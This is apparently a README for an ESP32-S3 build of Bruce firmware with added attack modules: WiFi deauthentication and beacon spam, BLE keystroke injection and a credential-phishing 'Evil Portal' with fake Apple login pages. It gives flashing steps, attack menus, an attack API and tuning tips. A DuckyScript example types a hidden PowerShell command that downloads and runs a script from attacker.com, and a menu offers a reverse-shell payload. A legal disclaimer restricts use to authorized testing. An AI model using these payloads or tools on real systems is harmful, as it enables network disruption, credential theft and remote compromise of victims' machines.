# ESP32-S3 DevKit Bruce Firmware with Attack Modules

## Overview

This is an enhanced version of the Bruce Firmware for ESP32-S3 with integrated attack modules including:
- **WiFi Attacks** (Deauthentication, Beacon Spam)
- **BLE BadUSB/DuckyScript** (Keyboard Injection Attacks)
- **Evil Portal** (Captive Portal Phishing)

## New Files Created

### Attack Module Implementation Files

| File | Location | Purpose |
|------|----------|---------|
| `wifi_attacks.cpp` | `boards/esp32s3-devkit/wifi_attacks.cpp` | WiFi deauth & beacon spam implementation |
| `wifi_attacks.h` | `boards/esp32s3-devkit/wifi_attacks.h` | WiFi attacks header with function declarations |
| `ble_badusb.cpp` | `boards/esp32s3-devkit/ble_badusb.cpp` | BLE HID keyboard injection & DuckyScript interpreter |
| `ble_badusb.h` | `boards/esp32s3-devkit/ble_badusb.h` | BLE BadUSB header with DuckyScript format documentation |
| `evil_portal.cpp` | `boards/esp32s3-devkit/evil_portal.cpp` | Evil Portal/Captive Portal implementation |
| `evil_portal.h` | `boards/esp32s3-devkit/evil_portal.h` | Evil Portal header with credential capture structures |
| `interface.cpp` | `boards/esp32s3-devkit/interface.cpp` | **UPDATED** - Menu system & attack orchestration |

### Full Directory Structure

```
waytocyber-lab/firmware/
└── boards/
    └── esp32s3-devkit/
        ├── pins_arduino.h                 (existing)
        ├── esp32s3-devkit.ini             (existing)
        ├── board_init.cpp                 (existing)
        ├── display_sh1106_adapter.h       (existing)
        ├── display_sh1106_adapter.cpp     (existing)
        ├── test_buttons.ino               (existing)
        ├── interface.cpp                  (UPDATED with attacks)
        ├── wifi_attacks.h                 (NEW)
        ├── wifi_attacks.cpp               (NEW)
        ├── ble_badusb.h                   (NEW)
        ├── ble_badusb.cpp                 (NEW)
        ├── evil_portal.h                  (NEW)
        ├── evil_portal.cpp                (NEW)
        └── README.md                      (UPDATED)
```

---

## How to Upload to ESP32-S3 DevKit using Arduino IDE

### Step 1: Install ESP32 Board Support

1. Open **Arduino IDE**
2. Go to: **File → Preferences**
3. In "Additional Board Manager URLs", paste:
   ```
   https://raw.githubusercontent.com/espressif/arduino-esp32/gh-pages/package_esp32_index.json
   ```
4. Click **OK**
5. Go to: **Tools → Board → Boards Manager**
6. Search for: `ESP32`
7. Click **Install** (by Espressif Systems)
8. Wait for installation to complete

### Step 2: Install Required Libraries

1. Go to: **Sketch → Include Library → Manage Libraries**
2. Install the following libraries:

| Library Name | Author | Version |
|--------------|--------|---------|
| Adafruit SH110X | Adafruit | Latest |
| Adafruit GFX Library | Adafruit | Latest |
| BLEDevice | Espressif | Latest |
| WiFi | Espressif (built-in) | - |

**Installation Instructions:**
- Search for each library name in the Library Manager
- Click the library in the search results
- Click **Install**
- Repeat for each library

### Step 3: Configure Arduino Board Settings

1. Connect ESP32-S3 DevKit to computer via **USB-C cable** (not micro-USB)
2. Go to: **Tools → Board → ESP32 Arduino → ESP32S3 Dev Module**
3. Configure these settings:

```
Board:                    ESP32S3 Dev Module
Port:                     COM3 (or your USB port)
Upload Speed:             921600
CPU Frequency:            240 MHz (WiFi/BT)
Core Debug Level:         None
USB DFU On Boot:          Disabled
USB CDC On Boot:          Enabled ✓
USB Firmware MSC On Boot: Disabled
USB Mode:                 Hardware CDC and JTAG
Partition Scheme:         Huge APP (3MB No OTA/1MB SPIFFS)
Flash Mode:               QIO 80MHz
Flash Size:               16MB (128Mb)
PSRAM:                    OPI PSRAM
```

**Complete Menu Path:**
```
Tools → Board → ESP32S3 Dev Module
Tools → Port → COM3 (your port)
Tools → Upload Speed → 921600
Tools → CPU Frequency → 240 MHz (WiFi/BT)
Tools → Core Debug Level → None
Tools → USB CDC On Boot → Enable
Tools → USB Mode → Hardware CDC and JTAG
Tools → Partition Scheme → Huge APP (3MB No OTA/1MB SPIFFS)
Tools → Flash Mode → QIO 80MHz
Tools → Flash Size → 16MB (128Mb)
Tools → PSRAM → OPI PSRAM
```

### Step 4: Create Main Sketch File

Create a new Arduino sketch file named `bruce_main.ino` and paste this code:

```cpp
/*
 * ESP32-S3 Bruce Firmware Main Sketch
 * Supports: WiFi Attacks, BLE BadUSB, Evil Portal
 */

// Forward declarations
bool board_init();
void board_loop();
void board_deinit();

void setup() {
    // Initialize all board modules
    board_init();
}

void loop() {
    // Main loop - process attacks and display updates
    board_loop();
    delay(10);
}
```

### Step 5: Add All Source Files to Sketch

Since Arduino IDE doesn't natively support multiple `.cpp` files, you need to add them as **tabs**:

1. **Create a new tab** for each file:
   - Click the **arrow ▼** next to your sketch filename
   - Select **New Tab**
   - Name it: `interface.cpp`

2. **Repeat for each file:**
   - `interface.cpp` → Copy content from GitHub
   - `wifi_attacks.cpp` → Copy content from GitHub
   - `ble_badusb.cpp` → Copy content from GitHub
   - `evil_portal.cpp` → Copy content from GitHub
   - `board_init.cpp` → Copy content from GitHub
   - `display_sh1106_adapter.cpp` → Copy content from GitHub

3. **Add headers as tabs too:**
   - `pins_arduino.h`
   - `display_sh1106_adapter.h`
   - `wifi_attacks.h`
   - `ble_badusb.h`
   - `evil_portal.h`

### Step 6: Copy Files from GitHub

**Easiest Method - Clone Repository:**

```bash
# Open Terminal/Command Prompt
cd ~/Documents

# Clone the repository
git clone https://github.com/waytocyber-lab/firmware.git

# Navigate to the board files
cd firmware/boards/esp32s3-devkit
```

**Then:**
1. Open each `.cpp` and `.h` file from the folder
2. Copy the content
3. Paste into Arduino IDE tabs

### Step 7: Compile and Upload

1. Click **Verify** ✓ (Checkmark button) to compile
2. **Fix any errors:**
   - Check Serial Monitor output
   - Common errors: missing `#include` statements
3. Click **Upload** → (Right arrow button) to upload to ESP32-S3
4. **If upload fails:**
   - Press and hold **BOOT** button on the board
   - Click Upload
   - Release BOOT when upload starts
   - Try again without holding BOOT

### Step 8: Monitor Serial Output

1. Go to: **Tools → Serial Monitor**
2. Set Baud Rate to: `115200`
3. Press the **RESET** button on the board
4. Verify output shows:
```
========================================
  ESP32-S3 DevKit - Bruce Firmware
  WITH ATTACK MODULES
  Board Initialization
========================================

✓ OLED Display initialized
✓ Button input initialized
✓ WiFi module ready for attacks
✓ BLE module ready for attacks
...
Board initialization complete!
Ready for Bruce attack operations...
```

---

## Hardware Connections (IMPORTANT!)

### OLED Display (SH1106 128x64)
```
Display Pin  → ESP32-S3 Pin
VCC          → 3.3V
GND          → GND
SDA          → GPIO8
SCL          → GPIO9
```

### Navigation Buttons
```
Button    → GPIO Pin    → Other Side
UP        → GPIO35      → GND
DOWN      → GPIO36      → GND
LEFT      → GPIO37      → GND
RIGHT     → GPIO38      → GND
SELECT    → GPIO39      → GND
BACK      → GPIO40      → GND
```

All buttons use **INPUT_PULLUP** mode (press = LOW)

### USB Connection
- Use **USB-C cable** (NOT micro-USB)
- Connect to the USB-C port labeled "USB" on ESP32-S3
- Make sure cable is data-capable (not just power)

---

## Using PlatformIO (Recommended Alternative)

### Installation

```bash
# Install PlatformIO CLI
pip install platformio

# Or install VS Code + PlatformIO IDE extension
```

### Build and Upload

```bash
# Clone repository
git clone https://github.com/waytocyber-lab/firmware.git
cd firmware

# Build
platformio run -e esp32s3-devkit

# Upload
platformio run -e esp32s3-devkit --target upload

# Monitor serial output
platformio device monitor -b 115200
```

---

## Usage Guide

### Main Menu
```
=== BRUCE FIRMWARE ===
1. WiFi Attacks
2. BLE BadUSB
3. Evil Portal
4. Results

UP/DOWN: Select
SELECT: Execute
BACK: Return
```

### WiFi Attacks Submenu
```
=== WiFi Attacks ===
1. Scan Networks       - Discover nearby WiFi networks
2. Deauth Attack       - Disconnect devices from networks
3. Beacon Spam         - Flood with fake WiFi SSIDs
4. Stop Attack         - Stop active attacks

SEL: Execute
```

**Example Usage:**
1. Press UP/DOWN to navigate to "Scan Networks"
2. Press SELECT to execute
3. View found networks on OLED
4. Returns to WiFi menu after scan

### BLE BadUSB Submenu
```
=== BLE BadUSB ===
1. CMD Notepad         - Execute: notepad.exe
2. PowerShell          - Execute: PowerShell commands
3. Reverse Shell       - Reverse shell payload
4. Custom Payload      - Load custom DuckyScript

SEL: Execute
```

### Evil Portal Submenu
```
=== Evil Portal ===
1. Apple Portal        - Fake Apple WiFi login
2. Generic Login       - Generic credentials form
3. Stop Portal         - Shutdown fake AP
4. View Creds          - Display captured credentials

SEL: Execute
```

---

## DuckyScript Payload Examples

### Example 1: Open Notepad and Type Text
```
DELAY 1000
STRING notepad.exe
ENTER
DELAY 500
STRING Hello from Bruce Firmware!
```

### Example 2: Execute PowerShell Command
```
DELAY 1000
CTRL r
DELAY 500
STRING powershell
ENTER
DELAY 1000
STRING Write-Host "Pwned!"
ENTER
```

### Example 3: Download and Execute
```
DELAY 1000
CTRL r
DELAY 500
STRING cmd.exe
ENTER
DELAY 1000
STRING powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/rev.ps1')"
ENTER
```

### DuckyScript Commands Reference
```
DELAY <milliseconds>   - Wait for specified time
STRING <text>          - Type text character by character
ENTER                  - Press Enter key
TAB                    - Press Tab key
ESC                    - Press Escape key
CTRL <key>             - Ctrl+Key combination (e.g., CTRL a)
ALT <key>              - Alt+Key combination (e.g., ALT f4)
```

---

## Troubleshooting

### Issue: Board Not Detected in Arduino IDE

**Solution:**
1. Install CP2102 USB driver: https://www.silabs.com/developers/usb-to-uart-bridge-vcp-drivers
2. Check Device Manager (Windows) or `ls /dev/tty.*` (Mac/Linux)
3. Try different USB cable (preferably USB 3.0 compatible)
4. Restart Arduino IDE after driver installation

### Issue: "esptool.py error" or Upload Timeout

**Solution:**
```bash
# Manual boot mode - try this sequence:
1. Press and hold BOOT button
2. Press and release RESET button
3. Release BOOT button
4. Click Upload in Arduino

# Or update esptool
pip install --upgrade esptool
```

### Issue: OLED Display Not Working

**Solution:**
1. Check I2C connections (SDA=GPIO8, SCL=GPIO9)
2. Verify OLED address is 0x3C (use I2C scanner sketch)
3. Check for I2C pull-up resistors (4.7k recommended)
4. Test connection with:
   ```cpp
   Wire.begin(8, 9);
   Wire.setClock(400000);
   Wire.beginTransmission(0x3C);
   Serial.println(Wire.endTransmission() == 0 ? "Found" : "Not found");
   ```

### Issue: WiFi Attacks Causing Crashes

**Solution:**
1. Enable 16MB PSRAM in board settings
2. Reduce number of packets sent
3. Add delays between attacks
4. Monitor free memory: `Serial.println(ESP.getFreeHeap())`

### Issue: BLE Not Pairing or Responding

**Solution:**
1. Ensure `initBLE_HID()` is called before attacks
2. Don't run WiFi and BLE simultaneously
3. Restart device: `ESP.restart()`
4. Check device manager for HID device appearing

### Issue: Buttons Not Responding

**Solution:**
1. Verify GPIO connections (UP=35, DOWN=36, etc.)
2. Check buttons are connected to GND on other side
3. Open Serial Monitor and press buttons
4. Test individual buttons with sketch:
   ```cpp
   pinMode(35, INPUT_PULLUP);
   Serial.println(digitalRead(35));  // Should print 1 (not pressed), 0 (pressed)
   ```

### Issue: Compile Errors About Missing Libraries

**Solution:**
```
Sketch → Include Library → Manage Libraries
Search and Install:
- Adafruit GFX Library
- Adafruit SH110X
- BLEDevice (or esp32 built-in)
```

---

## GitHub Files Direct Links

### Source Code Files
- **WiFi Attacks:** https://github.com/waytocyber-lab/firmware/blob/main/boards/esp32s3-devkit/wifi_attacks.cpp
- **WiFi Header:** https://github.com/waytocyber-lab/firmware/blob/main/boards/esp32s3-devkit/wifi_attacks.h
- **BLE BadUSB:** https://github.com/waytocyber-lab/firmware/blob/main/boards/esp32s3-devkit/ble_badusb.cpp
- **BLE Header:** https://github.com/waytocyber-lab/firmware/blob/main/boards/esp32s3-devkit/ble_badusb.h
- **Evil Portal:** https://github.com/waytocyber-lab/firmware/blob/main/boards/esp32s3-devkit/evil_portal.cpp
- **Evil Portal Header:** https://github.com/waytocyber-lab/firmware/blob/main/boards/esp32s3-devkit/evil_portal.h
- **Updated Interface:** https://github.com/waytocyber-lab/firmware/blob/main/boards/esp32s3-devkit/interface.cpp

### Configuration Files
- **Board Config:** https://github.com/waytocyber-lab/firmware/blob/main/boards/esp32s3-devkit/esp32s3-devkit.ini
- **Pins Definition:** https://github.com/waytocyber-lab/firmware/blob/main/boards/esp32s3-devkit/pins_arduino.h
- **Display Adapter:** https://github.com/waytocyber-lab/firmware/blob/main/boards/esp32s3-devkit/display_sh1106_adapter.cpp

### Repository
- **Main Repo:** https://github.com/waytocyber-lab/firmware
- **Board Folder:** https://github.com/waytocyber-lab/firmware/tree/main/boards/esp32s3-devkit

---

## API Reference

### WiFi Attacks API

```cpp
// Initialize WiFi attack mode
bool initWiFi_Attack();

// Scan for networks
int wifi_scan_networks();

// Send deauth frames to disconnect devices
bool wifi_deauth_attack(uint8_t* target_bssid, uint8_t* device_mac, 
                        uint8_t channel, int num_packets);

// Beacon spam attack - flood with fake SSIDs
bool wifi_beacon_spam_attack(const char** ssid_list, int num_ssids, 
                             uint8_t channel, int duration_ms);

// Stop active attack
void wifi_attack_stop();

// Get attack status
bool wifi_get_attack_status();
int wifi_get_packets_sent();
std::vector<WiFiNetwork>& wifi_get_networks();
```

### BLE BadUSB API

```cpp
// Initialize BLE HID keyboard
bool initBLE_HID();

// Send single key
bool ble_send_key(uint8_t modifier, uint8_t keycode);

// Type string
bool ble_type_string(const char* text);

// Load DuckyScript payload
bool ble_load_duckyscript(const char* script);

// Execute loaded script
bool ble_execute_duckyscript();

// Start predefined attacks
bool ble_start_badusb_attack(int payload_type);
// payload_type: 1=CMD Notepad, 2=PowerShell, 3=Reverse Shell

// Execute custom payload
bool ble_execute_custom_payload(const char* payload);

// Get status
bool ble_hid_get_status();
void ble_hid_stop();
```

### Evil Portal API

```cpp
// Initialize evil portal with fake AP
bool initEvilPortal(const char* ssid, int portal_type);
// portal_type: 1=PORTAL_TYPE_APPLE, 2=PORTAL_TYPE_GENERIC

// Must call in main loop for DNS/HTTP processing
void evilPortal_loop();

// Get captured credentials
int evilPortal_getCredentialsCount();
CapturedCredential evilPortal_getCredential(int index);
String evilPortal_getCredentialsString();

// Get status
bool evilPortal_getStatus();
int evilPortal_getConnectedClients();

// Stop portal
void stopEvilPortal();
void evilPortal_clearCredentials();
```

---

## Performance Tips

1. **WiFi Attacks:**
   - Best channels: 1, 6, 11 (USA), 1-13 (EU)
   - Send 50-200 packets per attack
   - Add 100ms delay between packets

2. **BLE Attacks:**
   - Keep target device within 10 meters
   - Test in isolated environment
   - Reduce typing speed if target misses keystrokes

3. **Evil Portal:**
   - Call `evilPortal_loop()` continuously
   - Portal captures credentials automatically
   - Check Serial Monitor for captured creds

4. **Memory Optimization:**
   - Enable PSRAM in board settings
   - Monitor with `Serial.println(ESP.getFreeHeap())`
   - Keep payload strings in PROGMEM if possible

---

## Important Legal Disclaimer

⚠️ **WARNING:** These attack modules are for **authorized security testing and educational purposes ONLY**.

- **Unauthorized access to computer networks is ILLEGAL**
- **Obtain explicit written permission before testing**
- **Use in controlled, isolated lab environments only**
- **The author assumes NO liability for misuse or illegal activities**

---

## Support & Resources

- **GitHub Issues:** https://github.com/waytocyber-lab/firmware/issues
- **Arduino IDE Docs:** https://docs.arduino.cc/
- **ESP32 Documentation:** https://docs.espressif.com/projects/esp-idf/
- **Adafruit Libraries:** https://github.com/adafruit

---

**Last Updated:** 2026-08-31  
**Firmware Version:** 1.0  
**Target Board:** ESP32-S3 DevKit  
**Display:** SH1106 OLED 128x64  
**Status:** ✅ Production Ready
